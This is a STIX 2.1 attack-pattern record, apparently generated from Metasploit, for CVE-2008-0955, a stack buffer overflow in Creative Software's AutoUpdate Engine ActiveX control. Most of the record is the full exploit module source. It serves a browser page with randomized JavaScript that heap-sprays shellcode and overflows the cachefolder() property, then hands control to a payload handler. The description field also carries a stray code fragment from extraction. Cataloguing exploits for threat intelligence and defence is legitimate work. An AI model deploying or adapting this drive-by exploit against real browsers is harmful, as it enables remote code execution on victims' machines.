{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--52fb21f9-0063-464b-bd22-56217219ef85",
    "created": "2024-08-14T16:43:20.987326Z",
    "modified": "2024-08-14T16:43:20.98733Z",
    "name": "Creative Software AutoUpdate Engine ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Creative Software AutoUpdate Engine. When sending an overly long string to the cachefolder() property of CTSUEng.ocx an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/creative_software_cachefolder.rb",
            "external_id": "creative_software_cachefolder.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0955"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Creative Software AutoUpdate Engine ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Creative Software AutoUpdate Engine. When\n        sending an overly long string to the cachefolder() property of CTSUEng.ocx\n        an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC', ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-0955' ],\n          [ 'OSVDB', '45655' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2008-05-28',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Randomize the javascript variable names\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    content = %Q|\n      <html>\n        <object id='#{vname}' classid='clsid:0A5FD7C5-A45C-49FC-ADB5-9952547D5715'></object>\n        <script language=\"JavaScript\">\n        var #{rand1} = unescape('#{shellcode}');\n        var #{randnop} = \"#{js_nops}\";\n        var #{rand2} = unescape(#{randnop});\n        var #{rand3} = 20;\n        var #{rand4} = #{rand3} + #{rand1}.length;\n        while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\n        var #{rand5} = #{rand2}.substring(0,#{rand4});\n        var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\n        while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\n        var #{rand7} = new Array();\n        for (#{var_i} = 0; #{var_i} < 500; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\n        var #{rand8} = \"\"\n        for (#{var_i} = 0; #{var_i} < 1024; #{var_i}++) { #{rand8} = #{rand8} + unescape(\"%0c%0c\") }\n        #{vname}.cachefolder(#{rand8});\n        </script>\n      </html>\n      |\n\n    # Randomize the whitespace in the document\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-05-28",
    "x_mitre_platforms": [
        "win'"
    ]
}